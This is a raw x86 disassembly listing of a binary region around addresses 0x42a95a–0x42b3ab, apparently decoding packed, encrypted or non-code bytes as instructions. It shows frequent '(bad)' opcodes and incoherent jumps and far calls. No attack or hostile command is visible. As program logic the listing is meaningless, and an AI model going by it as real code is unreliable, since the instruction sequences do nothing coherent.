  42a95a:	xor    ebx,DWORD PTR [edi+0x5bbe02f0]
  42a960:	and    BYTE PTR [esi+0x149830bc],0x34
  42a967:	push   eax
  42a968:	sbb    BYTE PTR [ebx+0x4bf5f4a],bl
  42a96e:	jns    0x42a91d
  42a970:	fcmovb st,st(0)
  42a972:	shl    BYTE PTR [edx],1
  42a974:	mov    edx,0xb859d47f
  42a979:	fst    QWORD PTR [eax-0x28062f06]
  42a97f:	jp     0x42a9b5
  42a981:	cwde   
  42a982:	jl     0x42a980
  42a984:	rcl    DWORD PTR [eax+ebp*2],0x84
  42a988:	test   BYTE PTR [ecx],dh
  42a98a:	pushf  
  42a98b:	or     al,0x5d
  42a98d:	(bad)
  42a990:	jle    0x42a9fa
  42a992:	fild   QWORD PTR [edx]
  42a994:	(bad)  
  42a995:	mov    WORD PTR [esi],cs
  42a997:	sub    ebx,0xfffffff8
  42a99a:	ds or  eax,0xe8cf1808
  42a9a0:	lock cmp eax,eax
  42a9a3:	mov    eax,0x51a5f3ac
  42a9a8:	retf   
  42a9a9:	or     eax,0xb138c879
  42a9ae:	lods   eax,DWORD PTR ds:[esi]
  42a9af:	pop    ss
  42a9b0:	fs pop ecx
  42a9b2:	and    DWORD PTR [ecx],0xfadd24c9
  42a9b8:	pop    ebp
  42a9b9:	stc    
  42a9ba:	inc    ebp
  42a9bb:	bound  ebp,QWORD PTR [edx+0x1a4e4bb1]
  42a9c1:	xor    DWORD PTR [eax],eax
	...
  42aa33:	add    dh,cl
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	or     esi,esi
  42aa42:	inc    edx
  42aa43:	xchg   BYTE PTR [esp+eax*8+0x1],bh
  42aa47:	add    dh,dh
  42aa49:	add    BYTE PTR [eax],al
  42aa4b:	add    ch,al
  42aa4d:	mov    fs,WORD PTR [edx+0x25cb822e]
  42aa53:	xor    BYTE PTR [esp+edx*8-0x55dd7cb9],0x77
  42aa5b:	rol    ah,1
  42aa5d:	jp     0x42aa65
  42aa5f:	pop    bx
  42aa61:	mov    ds:0x89cd7b8e,eax
  42aa66:	and    al,BYTE PTR [esi-0x4f]
  42aa69:	cwde   
  42aa6a:	fwait
  42aa6b:	das    
  42aa6c:	or     dh,BYTE PTR [ebx+0x38]
  42aa6f:	imul   ecx,DWORD PTR [ebp+0x7e],0x759d0bd
  42aa76:	mov    dl,0xf7
  42aa78:	sbb    al,0xc5
  42aa7a:	ja     0x42aa95
  42aa7c:	ds daa 
  42aa7e:	je     0x42aaa6
  42aa80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aa81:	repnz ffree st(4)
  42aa84:	pop    ebx
  42aa85:	adc    al,0xc
  42aa87:	push   esi
  42aa88:	sbb    eax,DWORD PTR [edx]
  42aa8a:	(bad)  
  42aa8c:	call   0xb47f:0x427f1f74
  42aa93:	test   BYTE PTR [ecx-0xc43407a],cl
  42aa99:	aaa    
  42aa9a:	push   esi
  42aa9b:	mov    eax,ds:0x1d8c4785
  42aaa0:	push   ebx
  42aaa1:	dec    eax
  42aaa2:	fwait
  42aaa3:	xor    bl,0xa4
  42aaa6:	pop    edx
  42aaa7:	or     ecx,ebp
  42aaa9:	jb     0x42aabc
  42aaab:	lods   al,BYTE PTR ds:[esi]
  42aaac:	ins    DWORD PTR es:[edi],dx
  42aaad:	cdq    
  42aaae:	js     0x4aa3bc1b
  42aab4:	ss into 
  42aab6:	cmp    al,0x1d
  42aab8:	test   eax,0x982e1557
  42aabd:	into   
  42aabe:	imul   edi,DWORD PTR [ebx+0x3e4cea1a],0x76
  42aac5:	fidiv  DWORD PTR [edx-0x4d]
  42aac8:	int3   
  42aac9:	pop    ss
  42aaca:	push   es
  42aacb:	and    cl,BYTE PTR [ebx+0x6c17cbb8]
  42aad1:	mov    ch,0x90
  42aad3:	(bad)  
  42aad4:	push   cs
  42aad5:	xor    al,0x69
  42aad7:	int    0xaf
  42aad9:	sub    DWORD PTR [esi-0x1],ebx
  42aadc:	adc    bh,BYTE PTR gs:[eax-0x57e725f8]
  42aae3:	pushf  
  42aae4:	outs   dx,DWORD PTR ds:[esi]
  42aae5:	cmp    cl,BYTE PTR [edi-0xd7ebf6d]
  42aaeb:	sub    al,0xeb
  42aaed:	xchg   DWORD PTR [edi+edi*4-0x1f],eax
  42aaf1:	(bad)  
  42aaf2:	ror    DWORD PTR [edi+ebp*8],cl
  42aaf5:	ret    
  42aaf6:	mov    edi,0xc9c9d3f2
  42aafb:	sbb    DWORD PTR [esi+0x4e6d35c3],esp
  42ab01:	pop    ecx
  42ab02:	sbb    eax,0x78ef7010
  42ab07:	aam    0x6b
  42ab09:	sahf   
  42ab0a:	push   0xffffffb1
  42ab0c:	leave  
  42ab0d:	push   edi
  42ab0e:	pop    eax
  42ab0f:	sub    dl,BYTE PTR [esi]
  42ab11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab12:	push   edi
  42ab13:	mov    ch,0xd4
  42ab15:	cld    
  42ab16:	dec    edi
  42ab17:	jno    0x42aab5
  42ab19:	fisubr WORD PTR gs:[edi+edi*1-0x24]
  42ab1e:	add    BYTE PTR [edx-0x1acbeaa4],0xb9
  42ab25:	push   ds
  42ab26:	dec    ecx
  42ab27:	je     0x42ab72
  42ab29:	jecxz  0x42aaf6
  42ab2b:	cdq    
  42ab2c:	lds    ebp,FWORD PTR [ebx]
  42ab2e:	push   ds
  42ab2f:	lds    edi,FWORD PTR [ebx+0x64bf695a]
  42ab35:	or     cl,BYTE PTR [ecx-0xd]
  42ab38:	(bad)  
  42ab39:	enter  0x4380,0x4d
  42ab3d:	mov    edi,DWORD PTR ds:0x2169e5
	...
  42abb3:	add    BYTE PTR [ebx-0x487759ea],ah
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	sti    
  42abc1:	dec    eax
  42abc2:	rcr    BYTE PTR [ecx],0x72
  42abc5:	lds    eax,FWORD PTR [ecx]
  42abc7:	add    dh,dh
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    BYTE PTR [ebx],dh
  42abcd:	xchg   esi,eax
  42abce:	(bad)  
  42abcf:	retf   
  42abd0:	ds pushf 
  42abd2:	sub    cl,dh
  42abd4:	lahf   
  42abd5:	push   0xa
  42abd7:	cld    
  42abd8:	rol    BYTE PTR [eax-0x41fdc3a6],1
  42abde:	mov    bh,0xa8
  42abe0:	xchg   ebp,eax
  42abe1:	loope  0x42abdb
  42abe3:	js     0x42abbf
  42abe5:	pop    eax
  42abe6:	arpl   WORD PTR [ebp+0x26],dx
  42abe9:	xchg   ecx,eax
  42abea:	mov    ah,0xe7
  42abec:	pop    ss
  42abed:	fisub  DWORD PTR [ebx+ebp*4+0x72f6d8b0]
  42abf4:	mov    ebp,0xe648fbbb
  42abf9:	out    0x48,eax
  42abfb:	xor    DWORD PTR [ecx-0x4],0x72d21964
  42ac02:	addr16 cwde 
  42ac04:	in     eax,dx
  42ac05:	popf   
  42ac06:	enter  0x3ffb,0x2c
  42ac0a:	clc    
  42ac0b:	or     al,BYTE PTR [eax+0x3e8a0b8d]
  42ac11:	jbe    0x42ac74
  42ac13:	xchg   esp,eax
  42ac14:	lock test DWORD PTR [eax+0x17b52424],ebx
  42ac1b:	test   al,0x82
  42ac1d:	in     al,0x56
  42ac1f:	mov    eax,0x7da13a85
  42ac24:	shl    DWORD PTR [ebx+0x354104db],1
  42ac2a:	sti    
  42ac2b:	mov    ds:0x6775418f,al
  42ac30:	cmp    esi,ecx
  42ac32:	std    
  42ac33:	pop    ecx
  42ac34:	cmp    DWORD PTR [ecx-0x1713b0be],ecx
  42ac3a:	int    0xdb
  42ac3c:	mov    ah,0x95
  42ac3e:	pop    esp
  42ac3f:	or     al,0x50
  42ac41:	fmul   st(7),st
  42ac43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac44:	in     eax,0x82
  42ac46:	jle    0x42ac3c
  42ac48:	rcl    BYTE PTR fs:[edi+0x52],cl
  42ac4c:	sbb    al,dh
  42ac4e:	pop    ds
  42ac4f:	dec    eax
  42ac50:	scas   eax,DWORD PTR es:[edi]
  42ac51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac52:	push   0xa3bebe31
  42ac57:	dec    esi
  42ac58:	ja     0x42ac22
  42ac5a:	pushf  
  42ac5b:	rol    eax,cl
  42ac5d:	adc    al,cl
  42ac5f:	xor    al,0x76
  42ac61:	jo     0x42ac90
  42ac63:	clc    
  42ac64:	sub    eax,0x4f802880
  42ac69:	and    al,0xd7
  42ac6b:	mov    dl,0xcf
  42ac6d:	inc    BYTE PTR [edi+0x73177121]
  42ac73:	ins    DWORD PTR es:[edi],dx
  42ac74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac75:	jg     0x42ac65
  42ac77:	sti    
  42ac78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac79:	ins    DWORD PTR es:[edi],dx
  42ac7a:	pop    ecx
  42ac7b:	scas   al,BYTE PTR es:[edi]
  42ac7c:	neg    BYTE PTR [esp+ebx*8+0x5912c030]
  42ac83:	xlat   BYTE PTR ds:[ebx]
  42ac84:	sub    edi,ecx
  42ac86:	fisttp DWORD PTR ds:0x2a593921
  42ac8c:	loop   0x42ac9b
  42ac8e:	sub    esp,DWORD PTR [eax]
  42ac90:	push   ds
  42ac91:	adc    eax,0x926ce0e9
  42ac96:	frstor [edx+0x7891e2de]
  42ac9c:	inc    eax
  42ac9d:	pop    ebp
  42ac9e:	daa    
  42ac9f:	jno    0x42ac6e
  42aca1:	stos   BYTE PTR es:[edi],al
  42aca2:	nop
  42aca3:	scas   eax,DWORD PTR es:[edi]
  42aca4:	(bad)
  42aca7:	jne    0x42acb5
  42aca9:	mov    eax,ds:0xd3e145c0
  42acae:	int    0x8
  42acb0:	out    dx,al
  42acb1:	outs   dx,DWORD PTR ds:[esi]
  42acb2:	or     al,BYTE PTR [edx+0x36]
  42acb5:	sbb    edx,DWORD PTR [esi-0x63278187]
  42acbb:	scas   al,BYTE PTR es:[edi]
  42acbc:	js     0x42acfa
  42acbe:	stos   DWORD PTR es:[edi],eax
  42acbf:	in     eax,0x2f
  42acc1:	rol    DWORD PTR [eax],0x0
	...
  42ad34:	fwait
  42ad35:	mov    bh,0xc4
  42ad37:	or     al,0xec
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	psraw  mm1,QWORD PTR [ecx]
  42ad42:	fsubp  st(4),st
  42ad44:	push   0xf60001c6
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    BYTE PTR [esi-0x67],bl
  42ad4e:	xor    ch,BYTE PTR [ebx+ebp*2]
  42ad51:	ja     0x42acd5
  42ad53:	dec    ebp
  42ad54:	xor    al,0x2e
  42ad56:	arpl   si,cx
  42ad58:	jbe    0x42ad50
  42ad5a:	pop    edi
  42ad5b:	pop    esp
  42ad5c:	inc    ebp
  42ad5d:	imul   esp,DWORD PTR [edx],0x53
  42ad60:	gs mov dl,0xdd
  42ad63:	stos   DWORD PTR es:[edi],eax
  42ad64:	push   ss
  42ad65:	jmp    0xa6ea31af
  42ad6a:	add    esi,ebx
  42ad6c:	jne    0x42ad59
  42ad6e:	mov    eax,DWORD PTR [esi+esi*8]
  42ad71:	xchg   BYTE PTR [ebp-0x5a],cl
  42ad74:	cmp    cl,BYTE PTR [ebx+0xb39fc79]
  42ad7a:	mov    bl,0xe5
  42ad7c:	imul   ecx,DWORD PTR [edx],0xffffffe6
  42ad7f:	inc    edx
  42ad80:	repz call 0xf3a8:0x638b4de6
  42ad88:	in     al,dx
  42ad89:	mov    edi,0xa3b54415
  42ad8e:	mov    dh,BYTE PTR [ecx+0x75]
  42ad91:	xor    BYTE PTR [esi-0x277f7f35],cl
  42ad97:	shl    esi,0x1a
  42ad9a:	nop
  42ad9b:	pop    eax
  42ad9c:	mov    edi,0xa5544d32
  42ada1:	adc    BYTE PTR [esi+0x6e],bh
  42ada4:	cdq    
  42ada5:	call   0xc5e7:0x3ee2cb7f
  42adac:	lods   al,BYTE PTR ds:[esi]
  42adad:	(bad)  
  42adae:	push   esp
  42adaf:	int3   
  42adb0:	repz mov WORD PTR [eax],ds
  42adb3:	jle    0x42ad7e
  42adb5:	into   
  42adb6:	rcl    BYTE PTR ds:0x466b6195,cl
  42adbc:	push   esp
  42adbd:	sahf   
  42adbe:	ins    DWORD PTR es:[edi],dx
  42adbf:	jmp    DWORD PTR [eax-0xc992718]
  42adc5:	je     0x42add1
  42adc7:	push   esp
  42adc8:	mov    ds:0x899ee7b0,al
  42adcd:	push   ebp
  42adce:	jb     0x42adab
  42add0:	pop    ebx
  42add1:	fwait
  42add2:	jg     0x42ae23
  42add4:	cli    
  42add5:	mov    cl,0xa9
  42add7:	repnz pop ss
  42add9:	sar    BYTE PTR ds:0x5b4aac7d,0x5c
  42ade0:	mov    edi,0x3f3d62bd
  42ade5:	popf   
  42ade6:	call   0x7040f9d5
  42adeb:	pop    ebp
  42adec:	(bad)  
  42aded:	push   ebp
  42adee:	out    0x51,al
  42adf0:	gs cli 
  42adf2:	fucom  st(2)
  42adf4:	cli    
  42adf5:	iret   
  42adf6:	mov    bl,0x2f
  42adf8:	jbe    0x42adf6
  42adfa:	mov    ecx,0xce9a6dde
  42adff:	pop    eax
  42ae00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae01:	bnd call DWORD PTR [esi+esi*4]
  42ae05:	repnz push edx
  42ae07:	push   edi
  42ae08:	or     al,0x2f
  42ae0a:	push   0x74
  42ae0c:	cdq    
  42ae0d:	fmulp  st(2),st
  42ae0f:	mov    al,ds:0x5b872842
  42ae14:	inc    eax
  42ae15:	sub    ah,BYTE PTR [edx+0x4ca3e4f8]
  42ae1b:	adc    al,0x6f
  42ae1d:	leave  
  42ae1e:	mov    esi,0xb93e35a9
  42ae23:	dec    edx
  42ae24:	jno    0x42ae13
  42ae26:	dec    eax
  42ae27:	cs div ch
  42ae2a:	and    bh,BYTE PTR [esi]
  42ae2c:	mov    ch,0x1e
  42ae2e:	dec    ecx
  42ae2f:	out    dx,al
  42ae30:	xor    edx,0xffffff96
  42ae33:	pop    ss
  42ae34:	adc    edx,DWORD PTR [ebx-0x5fd55177]
  42ae3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae3b:	jecxz  0x42ae9e
  42ae3d:	out    0x49,al
  42ae3f:	mov    cl,0x48
  42ae41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42aeb2:	add    BYTE PTR [eax],al
  42aeb4:	xor    DWORD PTR [ebp-0x38],eax
  42aeb7:	push   es
  42aeb8:	cld    
  42aeb9:	(bad)  
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	or     eax,0x5e07b4a0
  42aec5:	mov    DWORD PTR [ecx],0xf600
  42aecb:	add    BYTE PTR ds:0xa4c9fa3e,bh
  42aed1:	daa    
  42aed2:	mov    WORD PTR [eax+0x11],ds
  42aed5:	and    cl,al
  42aed7:	ret    0xe3fc
  42aeda:	fwait
  42aedb:	or     al,0xf4
  42aedd:	xlat   BYTE PTR ds:[ebx]
  42aede:	ins    DWORD PTR es:[edi],dx
  42aedf:	jp     0x42af4b
  42aee1:	jmp    0x42af25
  42aee3:	clc    
  42aee4:	ja     0x42ae74
  42aee6:	outs   dx,BYTE PTR ds:[esi]
  42aee7:	loopne 0x42aec7
  42aee9:	xlat   BYTE PTR ds:[ebx]
  42aeea:	push   ecx
  42aeeb:	inc    esi
  42aeec:	data16 mov cl,0x40
  42aeef:	mov    esi,0x343b0bd7
  42aef4:	cmp    esp,DWORD PTR [ecx]
  42aef6:	xchg   BYTE PTR [eax],bl
  42aef8:	je     0x42aea4
  42aefa:	mov    edi,0x9dbf1df7
  42aeff:	les    esp,FWORD PTR [ebx+0x22]
  42af02:	mov    dl,0xbd
  42af04:	std    
  42af05:	dec    esi
  42af06:	add    al,0xc6
  42af08:	loopne 0x42af42
  42af0a:	sub    eax,0xbaa8606f
  42af0f:	add    edx,DWORD PTR [ecx+edx*1]
  42af12:	pop    ebp
  42af13:	push   ss
  42af14:	xor    DWORD PTR [edx-0x41dc615],edi
  42af1a:	pop    ebp
  42af1b:	dec    eax
  42af1c:	push   0x72
  42af1e:	addr16 loopne 0x42af90
  42af21:	shl    BYTE PTR [edx+0x33],1
  42af24:	jns    0x42af2c
  42af26:	in     eax,dx
  42af27:	sbb    BYTE PTR [eax+0x20],ah
  42af2a:	sahf   
  42af2b:	fnsave [edx+ecx*8-0x48]
  42af2f:	in     eax,dx
  42af30:	xchg   esi,eax
  42af31:	pusha  
  42af32:	into   
  42af33:	mov    eax,ds:0xcd22a0f
  42af38:	aas    
  42af39:	ja     0x42af64
  42af3b:	push   0xa0b433ac
  42af40:	push   cs
  42af41:	cwde   
  42af42:	in     al,dx
  42af43:	xor    dh,BYTE PTR [esi-0x33d401a7]
  42af49:	repz mov cl,0x2e
  42af4c:	div    BYTE PTR [edi]
  42af4e:	fistp  QWORD PTR [esi]
  42af50:	mov    ebp,0x4bfa14a6
  42af55:	cmp    bh,BYTE PTR [ebx-0x362b73a9]
  42af5b:	push   0xffffffbf
  42af5d:	scas   al,BYTE PTR es:[edi]
  42af5e:	inc    eax
  42af5f:	lods   eax,DWORD PTR ds:[esi]
  42af60:	rcl    DWORD PTR [esi],1
  42af62:	adc    esi,DWORD PTR [edx]
  42af64:	or     bh,ah
  42af66:	scas   al,BYTE PTR es:[edi]
  42af67:	or     eax,0x32936935
  42af6c:	(bad)  
  42af6d:	push   0xffffffaf
  42af6f:	mov    cl,0x7
  42af71:	retf   
  42af72:	jmp    0x42aef5
  42af74:	cwde   
  42af75:	or     bl,BYTE PTR [ebx+0x21]
  42af78:	add    esi,edx
  42af7a:	mov    ecx,0x5411ffdd
  42af7f:	and    DWORD PTR [eax],0x2370405e
  42af85:	mov    ds:0xbd0411f6,eax
  42af8a:	retf   
  42af8b:	cmp    eax,0xab9eb22c
  42af90:	sbb    bh,bl
  42af92:	push   bp
  42af94:	jbe    0x42afbf
  42af96:	mov    eax,0x3717d2d
  42af9b:	or     al,0xfc
  42af9d:	dec    esp
  42af9e:	or     ch,bl
  42afa0:	dec    edx
  42afa1:	xchg   esi,eax
  42afa2:	aaa    
  42afa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42afa4:	xor    al,0x95
  42afa6:	jne    0x42af76
  42afa8:	mov    ebp,0x66f8add3
  42afad:	adc    eax,0xf3dd1ee9
  42afb2:	sbb    al,BYTE PTR [ebp+0x1f]
  42afb5:	add    eax,0xccd6a264
  42afba:	mov    dl,0x76
  42afbc:	out    0x11,al
  42afbe:	mov    dh,0xb
  42afc0:	dec    eax
  42afc1:	ret    0x0
	...
  42b034:	xlat   BYTE PTR ds:[ebx]
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0x4cc4
  42b042:	adc    ecx,DWORD PTR [edx]
  42b044:	push   esp
  42b045:	enter  0x1,0xf6
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    al,dl
  42b04d:	mov    al,0xda
  42b04f:	push   ss
  42b050:	mov    edi,edx
  42b052:	(bad)  
  42b053:	cli    
  42b054:	jae    0x42b027
  42b056:	shl    DWORD PTR [eax+eax*8],1
  42b059:	push   esi
  42b05a:	cmp    dh,BYTE PTR [edx-0x49111685]
  42b060:	mov    ebp,cs
  42b062:	or     eax,0xfd9718f3
  42b067:	push   0x3d3fb859
  42b06c:	adc    BYTE PTR [ecx],ah
  42b06e:	aas    
  42b06f:	and    BYTE PTR [edx],bl
  42b071:	enter  0xbeed,0x60
  42b075:	inc    esp
  42b076:	inc    edi
  42b077:	std    
  42b078:	jbe    0x42b070
  42b07a:	add    DWORD PTR [ebp+0x59],eax
  42b07d:	ins    DWORD PTR es:[edi],dx
  42b07e:	cld    
  42b07f:	dec    edi
  42b080:	sub    DWORD PTR [ebp-0x61f9a345],edi
  42b086:	lahf   
  42b087:	aas    
  42b088:	inc    ebx
  42b089:	in     al,0x4d
  42b08b:	js     0x42b074
  42b08d:	(bad)  
  42b08e:	sahf   
  42b08f:	call   0x263f0378
  42b094:	sti    
  42b095:	sub    al,bl
  42b097:	dec    edi
  42b098:	add    al,0xb2
  42b09a:	add    ch,bl
  42b09c:	icebp  
  42b09d:	hlt    
  42b09e:	adc    al,0x51
  42b0a0:	push   ss
  42b0a1:	and    dh,0x4a
  42b0a4:	sub    DWORD PTR [edx],0x371ad267
  42b0aa:	inc    ecx
  42b0ab:	repnz dec edi
  42b0ad:	pop    edi
  42b0ae:	sahf   
  42b0af:	xor    cl,bl
  42b0b1:	out    dx,eax
  42b0b2:	xchg   BYTE PTR [ebp-0x5],bh
  42b0b5:	popa   
  42b0b6:	mov    al,ds:0x837e66fd
  42b0bb:	cmp    BYTE PTR [eax],0x6f
  42b0be:	stos   DWORD PTR es:[edi],eax
  42b0bf:	mov    edx,DWORD PTR gs:[ebx+0x3b]
  42b0c3:	adc    dh,al
  42b0c5:	sub    eax,0x8a8736b7
  42b0ca:	and    edx,ebx
  42b0cc:	jle    0x42b0fc
  42b0ce:	mov    esi,0x4d3e53c
  42b0d3:	cmp    esp,DWORD PTR [eax+0x35c44cc6]
  42b0d9:	aam    0xda
  42b0db:	push   ss
  42b0dc:	xchg   edx,eax
  42b0dd:	xchg   ebx,eax
  42b0de:	push   eax
  42b0df:	ror    BYTE PTR [edx+0x29],cl
  42b0e2:	in     eax,0x4e
  42b0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b0e5:	mov    ch,BYTE PTR ds:[ecx]
  42b0e8:	das    
  42b0e9:	out    dx,al
  42b0ea:	dec    eax
  42b0eb:	adc    dh,BYTE PTR [esi]
  42b0ed:	repnz xor esp,DWORD PTR [ecx+0x516dd533]
  42b0f4:	jmp    0x196:0x7ede42df
  42b0fb:	out    0xd8,eax
  42b0fd:	ret    0xdbfe
  42b100:	popa   
  42b101:	add    dh,0xf6
  42b104:	or     BYTE PTR [ebp+edx*8+0xc],al
  42b108:	mov    dl,0xbb
  42b10a:	(bad)  
  42b10b:	popa   
  42b10c:	sbb    al,BYTE PTR [ecx-0x44fc9efa]
  42b112:	popa   
  42b113:	aaa    
  42b114:	hlt    
  42b115:	enter  0xa4b3,0x18
  42b119:	push   0x2633221e
  42b11e:	test   al,0xee
  42b120:	cmc    
  42b121:	lea    esi,[ebx+0x1a2d7c88]
  42b127:	adc    DWORD PTR [edi-0x642f41cb],ecx
  42b12d:	cwde   
  42b12e:	mov    edi,0x7b1a84a9
  42b133:	jno    0x42b12d
  42b135:	test   BYTE PTR [edx+eiz*1],ch
  42b138:	nop
  42b139:	fbstp  TBYTE PTR [edi-0x76]
  42b13c:	cmovb  edx,DWORD PTR [edx*1+0xc068]
	...
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	stc    
  42b1c1:	loopne 0x42b152
  42b1c3:	xor    BYTE PTR [edx-0x37],cl
  42b1c6:	add    DWORD PTR [eax],eax
  42b1c8:	test   BYTE PTR [eax],0x0
  42b1cb:	add    dh,bh
  42b1cd:	push   ecx
  42b1ce:	fwait
  42b1cf:	loop   0x42b170
  42b1d1:	add    BYTE PTR [ebx+0x497e4e57],bl
  42b1d7:	add    BYTE PTR [edi+eax*2-0x3e],ah
  42b1db:	fiadd  DWORD PTR [esi+0x386d5795]
  42b1e1:	hlt    
  42b1e2:	test   DWORD PTR [ebx+0x67c68d88],0x371eeb06
  42b1ec:	mov    dl,0xfc
  42b1ee:	arpl   di,sp
  42b1f0:	pop    eax
  42b1f1:	dec    ebx
  42b1f2:	imul   ebp,DWORD PTR [ebx+0x69ce666e],0x38
  42b1f9:	retf   
  42b1fa:	dec    ebp
  42b1fb:	and    ebx,esi
  42b1fd:	imul   edx,ebp,0xda0a8937
  42b203:	sub    al,cl
  42b205:	xor    esi,edx
  42b207:	and    ebp,edi
  42b209:	aaa    
  42b20a:	sbb    BYTE PTR [ecx],ch
  42b20c:	mov    bl,0xe5
  42b20e:	inc    ebx
  42b20f:	mov    ebx,0xd54cd2d3
  42b214:	ins    BYTE PTR es:[edi],dx
  42b215:	adc    bh,BYTE PTR [ecx-0x1955c4c7]
  42b21b:	dec    ecx
  42b21c:	iret   
  42b21d:	jl     0x42b270
  42b21f:	aad    0xb6
  42b221:	aad    0xa2
  42b223:	xor    DWORD PTR [ecx],ebx
  42b225:	sub    al,0xf0
  42b227:	pop    esp
  42b228:	ror    bl,0xf1
  42b22b:	jnp    0x42b29f
  42b22d:	mov    ch,dh
  42b22f:	pop    edx
  42b230:	sti    
  42b231:	inc    ecx
  42b232:	jmp    0x880b:0xe9232ca7
  42b239:	aas    
  42b23a:	sbb    DWORD PTR [edi-0x6f],esi
  42b23d:	push   0x160ed0c6
  42b242:	pushf  
  42b243:	and    ecx,DWORD PTR [esi+0x36]
  42b246:	mov    esi,0x2e7a7b19
  42b24b:	outs   dx,BYTE PTR ds:[esi]
  42b24c:	fs jg  0x42b287
  42b24f:	(bad)
  42b252:	int3   
  42b253:	jae    0x42b1d9
  42b255:	mov    cs:0xc37cd41d,eax
  42b25b:	data16 hlt 
  42b25d:	jl     0x42b28a
  42b25f:	aas    
  42b260:	inc    eax
  42b261:	leave  
  42b262:	jo     0x42b243
  42b264:	in     al,0xde
  42b266:	cmp    al,0x76
  42b268:	inc    ecx
  42b269:	addr16 pusha 
  42b26b:	out    0xcf,eax
  42b26d:	xchg   edx,eax
  42b26e:	fmul   DWORD PTR [edx-0x3f]
  42b271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b272:	xor    al,0xa0
  42b274:	xchg   ecx,eax
  42b275:	mov    BYTE PTR [ebx+0x105ac325],bh
  42b27b:	xlat   BYTE PTR ds:[ebx]
  42b27c:	jecxz  0x42b26a
  42b27e:	fld1   
  42b280:	mov    ch,0x2e
  42b282:	sbb    bl,BYTE PTR [ecx+0x18b67b5d]
  42b288:	pop    esi
  42b289:	xor    al,0x9a
  42b28b:	enter  0xaeb2,0xc8
  42b28f:	mov    ch,0x34
  42b291:	mov    ebx,DWORD PTR [edx]
  42b293:	xor    esi,ebp
  42b295:	push   ebp
  42b296:	sub    cl,BYTE PTR [eax]
  42b298:	push   ss
  42b299:	mov    bh,0x9d
  42b29b:	xchg   BYTE PTR [ecx-0xb],dh
  42b29e:	add    ebp,DWORD PTR [eax]
  42b2a0:	ja     0x42b2ed
  42b2a2:	jne    0x42b27e
  42b2a4:	sub    BYTE PTR [ecx],ah
  42b2a6:	push   ds
  42b2a7:	inc    eax
  42b2a8:	jmp    FWORD PTR [esi+0x20]
  42b2ab:	xchg   edi,eax
  42b2ac:	pop    eax
  42b2ad:	sti    
  42b2ae:	cld    
  42b2af:	dec    edi
  42b2b0:	imul   edx,DWORD PTR [eax-0x150119d8],0x263c8f72
  42b2ba:	mov    dh,0x4b
  42b2bc:	inc    ecx
  42b2bd:	cdq    
  42b2be:	(bad)  
  42b2bf:	loopne 0x42b271
  42b2c1:	test   BYTE PTR [eax],al
	...
  42b333:	add    BYTE PTR [edi+0xe],bh
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax-0x23],esi
  42b341:	sbb    esi,ebp
  42b343:	push   edi
  42b344:	inc    eax
  42b345:	retf   0x1
  42b348:	test   BYTE PTR [eax],0x0
  42b34b:	add    BYTE PTR [ebx-0x2655e16],al
  42b351:	int3   
  42b352:	and    al,0xd6
  42b354:	loope  0x42b362
  42b356:	mov    cl,0x51
  42b358:	in     eax,0xe5
  42b35a:	outs   dx,DWORD PTR ds:[esi]
  42b35b:	jmp    0x963fd4bb
  42b360:	ja     0x42b3a9
  42b362:	push   edi
  42b363:	(bad)  
  42b364:	into   
  42b365:	icebp  
  42b366:	ror    DWORD PTR [edx-0x78],1
  42b369:	jno    0x42b3a7
  42b36b:	mov    dl,0x84
  42b36d:	pop    edi
  42b36e:	mov    ah,0xb0
  42b370:	ins    BYTE PTR es:[edi],dx
  42b371:	sub    ah,bh
  42b373:	lods   eax,DWORD PTR ds:[esi]
  42b374:	mov    WORD PTR [eax],ds
  42b376:	add    ebp,DWORD PTR ss:[esi+0x304238db]
  42b37d:	pop    ss
  42b37e:	push   ebx
  42b37f:	inc    ecx
  42b380:	mov    ds:0xd52ff9ce,al
  42b385:	xlat   BYTE PTR ds:[ebx]
  42b386:	outs   dx,DWORD PTR ds:[esi]
  42b387:	mov    esi,0xac4f43f5
  42b38c:	xchg   ebx,eax
  42b38d:	xchg   ebx,eax
  42b38e:	sbb    BYTE PTR [edi-0x29],al
  42b391:	push   eax
  42b392:	(bad)  
  42b393:	cmp    esi,DWORD PTR [edx+0x70]
  42b396:	call   0x6f4d647a
  42b39b:	stos   DWORD PTR es:[edi],eax
  42b39c:	push   edi
  42b39d:	mov    DWORD PTR cs:[ebx-0x1e446e92],ebp
  42b3a4:	cmp    BYTE PTR [ebx],al
  42b3a6:	mov    al,ds:0x71e7ce8a
  42b3ab:	jo     0x42b353
